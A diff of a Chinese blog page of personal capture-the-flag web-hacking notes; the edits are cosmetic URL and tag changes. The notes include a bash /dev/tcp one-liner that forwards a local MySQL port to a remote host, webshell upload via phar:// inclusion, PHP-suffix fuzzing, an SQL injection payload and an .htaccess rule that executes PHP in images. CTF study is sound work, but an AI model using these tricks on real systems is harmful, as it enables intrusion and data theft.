@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="ctf,web," />
+  <meta name="keywords" content="web,ctf," />
 
 
 
@@ -84,20 +84,20 @@
 
 
 <meta name="description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
-<meta name="keywords" content="ctf,web">
+<meta name="keywords" content="web,ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="个人打CTF的一些总结">
-<meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2019&#x2F;11&#x2F;11&#x2F;zongjie.html">
+<meta property="og:url" content="&#x2F;2019&#x2F;11&#x2F;11&#x2F;zongjie.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
 <meta property="og:description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20190224160008531-1260082376.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170904171827038-754070839.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20190826205559423-235402880.png">
+<meta property="og:image" content="&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
+<meta property="og:image" content="&#x2F;images&#x2F;1063309-20190224160008531-1260082376.png">
+<meta property="og:image" content="&#x2F;images&#x2F;1063309-20170904171827038-754070839.png">
+<meta property="og:image" content="&#x2F;images&#x2F;1063309-20190826205559423-235402880.png">
 <meta property="og:updated_time" content="2020-08-26T04:20:30.696Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
+<meta name="twitter:image" content="&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
 
 
 
@@ -127,7 +127,7 @@
 
 
 
-  <link rel="canonical" href="http://mrjesen.github.io/2019/11/11/zongjie.html"/>
+  <link rel="canonical" href="/2019/11/11/zongjie.html"/>
 
 
 
@@ -260,7 +260,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://mrjesen.github.io/2019/11/11/zongjie.html">
+    <link itemprop="mainEntityOfPage" href="/2019/11/11/zongjie.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Jesen">
@@ -381,12 +381,12 @@
 <p>parse_url url中/全换成///</p>
 <p>反序列化遇到protected变量，可以直接把private改成public然后把生成的加上%00*%00</p>
 <p>strpos 大小写敏感，数组绕过也可。</p>
-<p>php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)<br>curl -x 123.45.67.89:1080 -o page.html <a href="http://www.ip.cn" target="_blank" rel="noopener">http://www.ip.cn</a> 代理访问</p>
+<p>php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)<br>curl -x 123.45.67.89:1080 -o page.html <a href="http://www.ip.cn">http://www.ip.cn</a> 代理访问</p>
 <p>php://input 获取post 记得改POST方法（数据不会urldecode）</p>
 <p>file_get_contents() file:// php:// zlib:// zip:// http://均可</p>
 <p>phar协议突破文件包含首先1.php压缩为1.zip更改后缀名为.jpg上传，然后利用文件读取直接包含。</p>
-<p><a href="http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马" target="_blank" rel="noopener">http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马</a></p>
-<p>.avi文件上传：<a href="https://github.com/neex/ffmpeg-avi-m3u-xbin" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></p>
+<p><a href="http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马">http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马</a></p>
+<p>.avi文件上传：<a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></p>
 <p>能读文件，apache下记得读/etc/apache2/sites-available/000-default.conf，会有一些配置文件</p>
 <p>上传文件后，如果服务器是linux系统，那么会在/tmp/目录下生成对应的临时文件phpinfo();<br>$query=’select * from flag where user=’.$user[0].’ and passwd=’.$passwd[0].’ &#39; ‘ ;</p>
 <p>要产生注入，则必须构造payload来截断单引号，打乱sql语句原来的构成标准。即可构造user=&amp;&amp;passwd=or 1#<br>此时sql语句为<br>select * from flag where user=’ &#39; and passwd= ‘ or 1# ‘;<br>url二次编码绕过单引号过滤</p>
@@ -414,7 +414,7 @@
 <p>21.door为数组则$secret将为null</p>
 <p><img src="/images/1063309-20190826205559423-235402880.png" alt="img"></p>
 <p>22.生成多个md5值相同的文件</p>
-<p><a href="https://www.yuque.com/sourcecode/2019hgame/magical_md5" target="_blank" rel="noopener">https://www.yuque.com/sourcecode/2019hgame/magical_md5</a></p>
+<p><a href="https://www.yuque.com/sourcecode/2019hgame/magical_md5">https://www.yuque.com/sourcecode/2019hgame/magical_md5</a></p>
 <p>23.php://filter 伪协议支持多个过滤器同时使用</p>
 <p>24..htaccess开启php解析引擎</p>
 <p>AddType application/x-httpd-php .png</p>
@@ -442,9 +442,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
             <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
         </div>
       
